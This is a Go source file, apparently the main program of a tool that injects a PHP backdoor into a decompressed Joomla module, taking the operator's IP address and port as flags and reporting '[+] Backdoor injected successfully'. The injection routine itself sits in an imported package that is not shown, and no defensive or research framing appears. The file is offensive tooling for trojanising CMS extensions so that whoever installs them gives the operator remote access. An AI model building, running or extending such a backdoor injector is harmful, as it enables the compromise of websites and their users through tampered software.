package main

import (
    "flag"
    "fmt"

    "data"
    "internals"
)

const reset = "\033[0m"
const red = "\033[31m"
const green = "\033[32m"

func main() {
    var addr data.Address 
    var backdoorPath string
    var modulePath string

    flag.StringVar(&addr.Ip, "ip", "", "your ip address")
    flag.IntVar(&addr.Port, "port", 0, "your port")
    flag.StringVar(&modulePath, "path", "", "path to your decompressed Joomla module")
    flag.StringVar(&backdoorPath, "backdoor", "./backdoor.php", "path to backdoor file")
    flag.Parse()
    
    err := internals.Inject(addr, backdoorPath, modulePath)
    if err != nil {
        fmt.Print(red, "[-] Error injecting backdoor: ", err)
    } else {
        fmt.Print(green, "[+] Backdoor injected successfully")
    }

    fmt.Println(reset)
}